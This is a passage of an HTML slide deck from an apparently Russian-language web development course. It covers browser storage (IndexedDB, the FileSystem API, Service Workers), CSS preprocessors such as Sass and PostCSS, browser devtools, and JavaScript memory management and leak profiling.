    </section>

    <section class="slide">
        <h2>IndexedDB</h2>
        <div>
            <ul>
                <li>Storage for "significant amounts of structured data" (source: MDN)</li>
                <li>More "free form" storage than WebSQL</li>
                <li>Uses an Index based API</li>
                <li>Asynchronous + Transaction</li>
                <li><a href="http://www.w3.org/TR/IndexedDB/">Spec</a></li>
            </ul>
        </div>
    </section>

    <section class="slide">
        <h2>IndexedDB - How Many/How Big?</h2>
        <div>
            <ul>
                <li>50 megs</li>
                <li>User may be prompted for more</li>
            </ul>
        </div>
    </section>

    <section class="slide">
        <h2>IndexedDB - Index wha???</h2>
        <div>
            <ul>
                <li>Getting values can be done by key (think primary key)</li>
                <li>You can make an index on (most) any property</li>
                <li>And by range (think list) on an index</li>
                <li>No free form search ala SQL</li>
                <!-- <li>So I can do "CamA to CamB" but not "CaXden"</li> -->
            </ul>
        </div>
    </section>

    <section class="slide">
        <h2>IndexedDB - Creation is Tricky</h2>
        <div>
        <ul>
            <li>You can only change structure by changing version</li>
            <li>If a user had version 1 and you're on version 3, you have to maintain the code to update between them</li>
            <li>So yeah, get it right the first time</li>
        </ul>
        </div>
    </section>

    <section class="slide">
        <h2>IndexedDB - Basic Terms</h2>
        <div>
            <ul>
                <li>
                    <b>key</b> - The primary key, can be autogenerated
                </li>
                <li>
                    <b>objectstore</b> - One set of data. Think table.
                </li>
                <li>
                    <b>index</b> - A way to get at the data and there can be more than one per object
                </li>
                <li>
                    <b>cursor</b> - A way to iterate over objects
                </li>
                <li>
                    <b>key range</b> - A way to specify a range of keys to be returned
                </li>
            </ul>
        </div>
    </section>

    <section class="slide">
        <h2>Just in case you missed it...</h2>
        <div>
        <ul>
            <li>WebSQL - great mobile support (all iOS, all Android)</li>
            <li>IndexedDB - no mobile support (iOS6 maybe, or Jelly Bean for all 2 of you)</li>
        </ul>
        </div>
    </section>

    <section class="slide">
        <h2>FileSystem</h2>
        <div>
        <ul>
            <li>Not the File API (<a href="http://www.w3.org/TR/FileAPI/">spec</a>), but we use it</li>
            <li>A sandbox for temporary/persistent file storage</li>
            <li>Asynchronous API for reading/writing/deleting directories and files</li>
            <li>Basic quota API (required for persistent storage)</li>
            <li><a href="http://www.w3.org/TR/file-system-api/">Spec</a></li>
        </ul>
        </div>
    </section>

    <section class="slide">
        <h2>FileSystem - Possible Uses?</h2>
        <div>
        <ul>
            <li>Storing binary resources for games/apps</li>
            <li>Storing drag/dropped files</li>
        </ul>
        </div>
    </section>

    <section class="slide">
        <h2>FileSystem - How Big?</h2>
        <div>
        <ul>
            <li>Ask the Quota API and good luck with that</li>
            <li>User will be prompted for persistent storage</li>
            <li>User is then prompted for more storage</li>
            <li>No way to disable it</li>
        </ul>
        </div>
    </section>

    <section class="slide">
        <h2>What you can do</h2>
        <div>
        <ul>
            <li>Create a directory</li>
            <li>List the contents of a directory</li>
            <li>Remove a directory recursively</li>
            <li>Create a file</li>
            <li>Get file metadata</li>
            <li>Remove a file</li>
            <li>Copy or move a file</li>
        </ul>
        </div>
    </section>

    <section class="slide">
        <h2>FileSystem Key Objects</h2>
        <div>
        <ul>
            <li>FileSystem</li>
            <li>DirectoryReader</li>
            <li>DirectoryEntry</li>
            <li>FileReader</li>
            <li>FileWriter</li>
            <li>FileEntry</li>
        </ul>
        </div>
    </section>

    <section class="slide">
        <h2>FileSystem - Demo</h2>
        <div>
            <a href="http://www.adobe.com/devnet/html5/articles/real-world-example-html5-filesystem-api.html">
                http://www.adobe.com/devnet/html5/articles/real-world-example-html5-filesystem-api.html
            </a>
        </div>
    </section>

    <section class="slide">
        <h2>FileSystem - FYI</h2>
        <div>
        <ul>
            <li>HTML5 File System Explorer (<a href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CGsQFjAA&url=https%3A%2F%2Fchrome.google.com%2Fwebstore%2Fdetail%2Fnhnjmpbdkieehidddbaeajffijockaea&ei=IO4aUIyAHYWfiAK8poHACg&usg=AFQjCNE1pcsYhXfK-V9o5pElMHiL1d3vVA&sig2=e4jOczuBDEYuZHNZxTJOLg">link</a>)</li>
            <li>Terminal (<a href="http://www.htmlfivewow.com/demos/terminal/terminal.html">link</a>)</li>
        </ul>
        </div>
    </section>

    <section class="slide">
        <h2>FileSystem - When can I use it?</h2>
        <div>
            <a href="http://caniuse.com/filesystem/embed">http://caniuse.com/filesystem/embed</a>
        </div>
    </section>


    <section class="slide shout">
        <h2>
            Service Workers
        </h2>
    </section>

    <section class="slide">
        <h2>Service Workers solve</h2>
        <div>
            <ul>
                <li>Offline usage</li>
                <li>Background processing</li>
                <li>Push messages, Alarms (Task Scheduler), BackgroundSync</li>
            </ul>
        </div>
    </section>

    <!--
    <header class="caption">
        <h1>VIII. Хранение данных</h1>
        <p>Cookies, localStorage, JSON.</p>
    </header>

    <section class="slide title">
 -->

    <!-- <section  class="slide">
        <div>
        <iframe src="//www.slideshare.net/slideshow/embed_code/key/q891VJPHuM1Gkz" width="100%" height="100%" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>
        </div>
    </section> -->


    <section class="slide">
        <h2>Reuse</h2>
        <div>
            <a href="https://www.slideshare.net/slideshow/embed_code/key/q891VJPHuM1Gkz">http://www.slideshare.net/jungkees/service-workers</a>
        </div>
    </section>

    <section class="slide">
        <h2>Домашнее задание</h2>
        <div>
            <pre>
                <code>Offline работа вашего приложеия</code>
            </pre>
        </div>
    </section>

    <!-- Рекомендованная леитература к лекции 7 "Сетевое взаимодействие" -->
    <section class="slide">
        <h2>Что почитать, посмотреть?</h2>
        <div>
        <h3>Почитать:</h3>
        <ol>
            <li>
                <a href="http://www.html5rocks.com/ru/features/storage">HTML5. Хранилище</a>
                <img alt="en" src="../../pics/en.gif">
                <a href="https://github.com/slightlyoff/ServiceWorker/blob/master/explainer.md">SW explainer</a>
            </li>
            <li>
                <img alt="habr" src="../../pics/habr.png">
                <a href="https://habrahabr.ru/post/245145/">Выразительный JavaScript: HTTP</a>
                <a href="https://habrahabr.ru/post/213515/">Готовим IndexedDB</a>
            </li>
        </ol>
        <h3>Посмотреть:</h3>
        <ol>
            <li>
                <img alt="en" src="../../pics/en.gif">
                <a href="http://playground.html5rocks.com/#localstorage">Playground</a>
            </li>
        </ol>
        </div>
    </section>

    <header class="caption">
        <h1>IX. Отладка и Оптимизация</h1>
        <p>Инструменты разработчика и профилирование</p>
    </header>

    <section class="slide title">
        <h2>
            <span>Инструменты для работы с CSS</span>
        </h2>
    </section>

    <section class="slide shout">
        <h2>
            Пре(Пост)процессоры CSS
        </h2>
    </section>

    <section class="slide">
        <h2>Зачем?</h2>
        <div>
            <pre>
                <code>ПЕРЕМЕННЫЕ</code>
                <code>DRY (DON’T REPEAT YOURSELF)</code>
                <code>ВЕНДОРНЫЕ ПРЕФИКСЫ</code>
                <code>БЭМ</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Пре(Пост)процессоры</h2>
        <div>
            <pre>
                <code><a href="http://sass-lang.com/">Sass</a></code>
                <code><a href="http://lesscss.org">LESS</a></code>
                <code><a href="http://learnboost.github.io/stylus/">Stylus</a></code>
                <code><a href="https://github.com/postcss/postcss">PostCSS</a></code>
            </pre>
        </div>
    </section>

    <section class="slide cover h bright">
        <img src="../../pics/sass-logo.png" alt="" />
    </section>

    <section class="slide cover h bright">
        <img src="../../pics/node-sass-logo.svg" alt="" />
    </section>

    <section class="slide">
        <h2>Установка sass</h2>
        <div>
            <pre>
                <code>Ruby (<a href="http://rubyinstaller.org">Windows</a>)</code>
                <code>$ sudo gem install sass</code>
                <code>$ sass --version</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Установка node-sass</h2>
        <div>
            <pre>
                <code>npm install node-sass</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Использование sass</h2>
        <div>
            <pre>
                <code>$ sass in.scss out.css</code>
                <code>$ sass --watch in.scss:out.css</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Использование node-sass</h2>
        <div>
            <pre>
                <code>var sass = require('node-sass');</code>
                <code>sass.render({</code>
                <code>  file: scss_filename,</code>
                <code>}, function(err, result) { /*...*/ });</code>
                <code>// OR</code>
                <code>var result = sass.renderSync({ data: scss_content });</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>SCSS: Variables</h2>
        <div>
            <pre>
                <code>$font-family: 'PT Serif', serif;</code>
                <code>$font-size: 18px;</code>
                <code>$line-height: $font-size * 1.5;</code>
                <code>$color: #333;</code>
                <code>body {</code>
                <code>    font: normal #{$font-size}/#{$line-height} $font-family;</code>
                <code>    color: $color; }</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>CSS</h2>
        <div>
            <pre>
                <code>body {</code>
                <code>    font: normal 18px/27px 'PT Serif', serif;</code>
                <code>    color: #333; }</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>SCSS: Nesting</h2>
        <div>
            <pre>
                <code>ul {</code>
                <code>    padding: 0;</code>
                <code>    li {</code>
                <code>        display: block;</code>
                <code>        &amp;:hover {</code>
                <code>            color: #eee; }</code>
                <code>    }</code>
                <code>}</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>CSS</h2>
        <div>
            <pre>
                <code>ul {</code>
                <code>    padding: 0; }</code>
                <code>ul li {</code>
                <code>    display: block; }</code>
                <code>ul li:hover {</code>
                <code>    color: #eee; }</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>SCSS: Nesting</h2>
        <div>
            <pre>
                <code>.toolbar {</code>
                <code>    …</code>
                <code>    &amp;__button {</code>
                <code>        …</code>
                <code>    }</code>
                <code>}</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>CSS</h2>
        <div>
            <pre>
                <code>.toolbar {</code>
                <code>    … }</code>
                <code>.toolbar__button {</code>
                <code>    … }</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>SCSS: Import &amp; Partials</h2>
        <div>
            <pre>
                <code><mark class="comment">/* _reset.scss */</mark></code>
                <code>html, body, ul, ol {</code>
                <code>    margin: 0; padding: 0; }</code>
            </pre>
            <pre>
                <code><mark class="comment">// main.scss</mark></code>
                <code>@import "reset";</code>
                <code>body { color: #333; }</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>CSS</h2>
        <div>
            <pre>
                <code>html, body, ul, ol {</code>
                <code>    margin: 0; padding: 0; }</code>
                <code>body {</code>
                <code>    color: #333; }</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>SCSS: Mixins<sub>*</sub></h2>
        <div>
            <pre>
                <code>@mixin box-sizing($value) {</code>
                <code>    -webkit-box-sizing: $value;</code>
                <code>    -moz-box-sizing: $value;</code>
                <code>    box-sizing: $value; }</code>
                <code>.button {</code>
                <code>    color: #333;</code>
                <code>    @include box-sizing(border-box); }</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>CSS</h2>
        <div>
            <pre>
                <code>.button {</code>
                <code>    color: #333;</code>
                <code>    -webkit-box-sizing: border-box;</code>
                <code>    -moz-box-sizing: border-box;</code>
                <code>    box-sizing: border-box; }</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>SCSS: Inheritance</h2>
        <div>
            <pre>
                <code>.message {</code>
                <code>    color: #333;</code>
                <code>    background: #eee;</code>
                <code>    padding: 8px; }</code>
                <code>.message_error {</code>
                <code>    @extend .message;</code>
                <code>    background: #e33; }</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>CSS</h2>
        <div>
            <pre>
                <code>.message {</code>
                <code>    color: #333;</code>
                <code>    background: #eee;</code>
                <code>    padding: 8px; }</code>
                <code>.message_error {</code>
                <code>    color: #333;</code>
                <code>    background: #e33;</code>
                <code>    padding: 8px; }</code>
            </pre>
        </div>
    </section>
    
    <section class="slide">
        <h2>SCSS: Lists and loops</h2>
        <div>
            <pre>
                    <code>$col_list = 1 2 3 4;</code>
                    <code>for $col in $col_list {</code>
                    <code>    td:nth-child({$col}) {</code>
                    <code>        width: 10% * $col;</code>
                    <code>    }</code>
                    <code>}            </code>
                    <code>for $col in (1..4) {...}</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>CSS: Lists and loops</h2>
        <div>
            <pre>
                <code>td:nth-child(1) {</code>
                <code>    width: 10%;</code>
                <code>}</code>
<code></code>
                <code>td:nth-child(2) {</code>
                <code>    width: 20%;</code>
                <code>}</code>
                <code>...</code>
        </div>
    </section>

    <section class="slide">
        <h2>SCSS: Conditional statements</h2>
        <div>
            <pre>
                <code>$theme = 'day';</code>
<code></code>
                <code>.sky {</code>
                <code>    if $theme == 'day' {</code>
                <code>        background: blue;</code>
                <code>        background-image: url(sun.png);</code>
                <code>    } else {</code>
                <code>        background: black;</code>
                <code>        background-image: url(stars.png);</code>
                <code>    }</code>
                <code>}</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>CSS: Conditional statements</h2>
        <div>
            <pre>
                <code>.sky {</code>
                <code>    background: #00f;</code>
                <code>    background-image: url(sun.png);</code>
                <code>}</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>PostCSS</h2>
        <div>
            <img src="../../pics/postcss-logo.png" alt="">
        </div>
    </section>

    <section class="slide">
        <h2>PostCSS - Зачем?</h2>
        <div>
            <ul>
                <li>Autoprefixer</li>
                <li>Удаление дубликатов</li>
                <li>Минификация</li>
                <li>Сжатие и инлайн картинок/шрифтов</li>
            </ul>
            <a href="http://postcss.parts/">Список плагинов</a>
        </div>
    </section>

    <section class="slide">
        <h2>PostCSS - Как?</h2>
        <div>
            <img src="../../pics/postcss.jpg" alt="">
        </div>
    </section>

    <section class="slide">
        <h2>PostCSS - Как?</h2>
        <div>
            <pre>
                <code>$ npm install -g postcss-cli</code>
                <code>$ npm install autoprefixer</code>
                <code>$ postcss --local-plugins autoprefixer
        -o main.compiled.css -d public/css public/css/main.css</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>sass VS node-sass VS postcss</h2>
        <div style="text-align: center;">
            <img src="../../pics/sass-perf.png" alt="">
        </div>
    </section>

    <section class="slide">
        <h2>CSS-Modules</h2>
        <div style="text-align: center;">
            <img src="../../pics/css-modules.png" alt="">
        </div>
    </section>

    <section class="slide">
        <h2>CSS-Modules - Зачем?</h2>
        <div>
            <ul>
                <li>Все классы находятся в локальной области видимости компонента</li>
                <li>Имена классов генерируются автоматически и являются уникальными</li>
                <li>&rarr; БЭМ не нужен</li>
            </ul>
        </div>
    </section>

    <section class="slide">
        <h2>CSS-Modules - Как?</h2>
        <div style="text-align: center;">
            <img src="../../pics/css-modules-work.png" alt="">
        </div>
    </section>

    <section class="slide shout">
        <h2>
            Web Inspector
        </h2>
    </section>

    <section class="slide">
        <h2>Инструменты</h2>
        <div>
            <pre>
                <code>Chrome DevTools <mark class="comment">/* Ctrl + Shift + I, ⌘ + ⇧ + I */</mark></code>
                <code>Safari Web Inspector <mark class="comment">/* ⌘ + ⌥ + I */</mark></code>
                <code>Firefox Web Developer <mark class="comment">/* Ctrl + Shift + I, ⌘ + ⇧ + I */</mark></code>
                <code>IE Developer Tools <mark class="comment">/* F12 */</mark></code>
                <code>Firebug <mark class="comment">/* Firefox Extension */</mark></code>
                <code>Opera Dragonfly <mark class="comment">/* Ctrl + Shift + I, ⌘ + ⌥ + I */</mark></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Возможности</h2>
        <div>
            <pre>
                <code>ИНСПЕКТОР DOM</code>
                <code>КОНСОЛЬ</code>
                <code>ОТЛАДЧИК JavaScript</code>
                <code>СЕТЕВАЯ АКТИВНОСТЬ</code>
                <code>ПРОФАЙЛЕРЫ</code>
                <code>ЭМУЛЯТОР</code>
            </pre>
        </div>
    </section>

    <section class="slide shout">
        <h2>
            Профилирование
        </h2>
    </section>

    <section class="slide">
        <h2>Области видимости</h2>
        <div>
            <ol>
                <li>
                    <b>Lexical Scoping (Lexical Environment)</b> -  область видимости ограничена текстом определения этой функции
                </li>
                <li>
                    <b>Dynamic Scoping</b> -  область видимости ограничена временем исполнения функции
                </li>
            </ol>
        </div>
    </section>

    <section class="slide">
        <h2>Lexical Environment</h2>
        <div>
            <pre>
                <code>var y = 5;</code>
                <code>var x = function(){</code>
                <code>  return y;</code>
                <code>};</code>
                <code>var z = function(t){</code>
                <code>  var y = 10;</code>
                <code>  return t();</code>
                <code>};</code>
                <code>console.log(z(x)); // ?</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Управление памятью</h2>
        <div>
            <ul>
                <li>
                    Главной концепцией управления памятью в JavaScript - <b>принцип достижимости</b>.
                </li>
                <li>
                    <b>Значение сохраняется</b> я в памяти, пока <b>доступно из корня</b> по ссылке или цепочке ссылок.
                </li>
            </ul>
        </div>

    </section>

    <section class="slide">
        <h2>Достижимыми изначально считаются</h2>
        <div>
            <ol>
                <li>
                    <b>Ссылки из стека вызова</b> -  локальные переменные, параметры функций
                </li>
                <li>
                    <b>Глобальные переменные</b> -  window, etc..
                </li>
            </ol>
        </div>
    </section>

    <section class="slide">
        <h2>Алгоритм сборки мусора</h2>
        <div>
            <pre>
                <code>function marry(man, woman) {</code>
                <code>  woman.husband = man;</code>
                <code>  man.wife = woman;</code>
                <code>  return {</code>
                <code>      father: man,</code>
                <code>      mother: woman</code>
                <code>}};</code>
                <code>var family = marry({ name: "Василий" }, { name: "Мария" });</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <div style="
        background-image: url('/pics/opt-family.png');
        background-size: contain;
        background-position: 50%;
        background-repeat: no-repeat;
        top: 40px;
        ">
        </div>
    </section>

    <section class="slide">
        <h2>Удаляем "Отца"</h2>
        <div>
            <pre>
                <code>delete family.father;</code>
                <code>delete family.mother.husband;</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <div style="
        background-image: url('/pics/opt-family-no-father.png');
        background-size: contain;
        background-position: 50%;
        background-repeat: no-repeat;
        top: 40px;
        ">
        </div>
    </section>

    <section class="slide">
        <h2>Удаляем "Семью"</h2>
        <div>
            <pre>
                <code>window.family = null;</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <div style="
            background-image: url('/pics/opt-family-no-family.png');
            background-size: contain;
            background-position: 50%;
            background-repeat: no-repeat;
            top: 40px;
        ">
        </div>
    </section>

    <section class="slide">
        <h2>Функции</h2>
        <div>
             <pre>
                <code>function f() {</code>
                <code>  var value = 123;</code>
                <code></code>
                <code>  function g() {} // g видна только изнутри</code>
                <code>}</code>
                <code></code>
                <code>f();</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Функции</h2>
        <div>
             <pre>
                <code>function f() {</code>
                <code>  var value = Math.random();</code>
                <code></code>
                <code>  function g() {} // g видна только изнутри</code>
                <code></code>
                <code>  return g;</code>
                <code>}</code>
                <code></code>
                <code>var g = f(); // функция g будет жить и сохранит ссылку на объект переменных</code>
                <code>// g->[[SCOPE f]]->value</code>
                <code></code>
                <code>g = null // вот теперь ссылка удалена</code>
                <code>var a = [f(), f(), f()] // а вот теперь 3 версии [[SCOPE]] в куче</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Пример утечки памяти</h2>
        <div>
            <ol>
                <li>
                    <a href="/p/examples/profiling.html">ссылка</a>
                </li>
            </ol>
        </div>
    </section>

    <section class="slide shout">
        <h2>
            Как искать утечки?
        </h2>
    </section>


    <section class="slide">
        <h2>
            Условия для работы
        </h2>
        <div>
            <ul>
                <li>Запущен только браузер</li>
                <li>Chrome запущен с дефолтными настройками (chrome://flags)</li>
                <li>Открыта только одна вкладка</li>
                <li>Выключены все плагины</li>
                <li>Инкогнито режим</li>
            </ul>
        </div>
    </section>

    <section class="slide">
        <h2>
            Теория
        </h2>
        <div>
            <p>
                <strong>JSHeap</strong> — граф из связанных объектов. Корнем этого графа обычно является глобальный объект (GC Roots).
            </p>
            <p>
                <strong>shallow size</strong> - чистое количество памяти, занимаемое объектом.
            </p>
            <p>
                <strong>retained size</strong> - это общее количество памяти, которое освободится при сборке мусора.
            </p>
        </div>
    </section>

    <section class="slide">
        <h2>
            API
        </h2>
        <div>
            <pre>
                <code>window.performance.memory</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>
            Примеры утечек от Google
        </h2>
        <div>
            <a href="https://developer.chrome.com/devtools/docs/demos/memory/example7">eval</a>
            <br>
            <a href="https://developer.chrome.com/devtools/docs/demos/memory/example10">Retaining path</a>
        </div>
    </section>

    <section class="slide">
        <h2>Домашнее задание</h2>
        <div>
            <pre>
                <code>ПОРТИРОВАТЬ CSS НА SASS.</code>
                <code>НАСТРОИТЬ WATCH ДЛЯ SCSS ФАЙЛОВ.</code>
                <code>РЕФАКТОРИНГ SCSS ФАЙЛОВ.</code>
            </pre>
        </div>
    </section>

    <!-- Рекомендованная леитература к лекции 9 "Отладка. SASS" -->
    <section class="slide">
        <h2>Что почитать, посмотреть?</h2>
        <div>
        <h3>Почитать:</h3>
        <ol>
            <li>
                <img alt="en" src="../../pics/en.gif">
                <a href="https://developer.chrome.com/devtools">Chrome DevTools Overview</a>
            </li>
            <li>
                <img alt="en" src="../../pics/en.gif">
                <a href="https://developer.chrome.com/devtools/docs/javascript-memory-profiling">JavaScript Memory Profiling</a>
            </li>
            <li>
                <img alt="en" src="../../pics/en.gif">
                <a href="http://sass-lang.com/">Документация SASS</a>
            </li>
        </ol>
        <h3>Посмотреть:</h3>
        <ol>
            <li>
                <img alt="en" src="../../pics/en.gif">
                <a href="http://sassmeister.com/">The sassiest way to play with Sass, Compass, & LibSass</a>
            </li>
        </ol>
        </div>
    </section>

    <div class="progress"><div></div></div>
    <script>hljs.initHighlightingOnLoad();</script>
    <script src="../../shower/shower.min.js"></script>
</body>
</html>
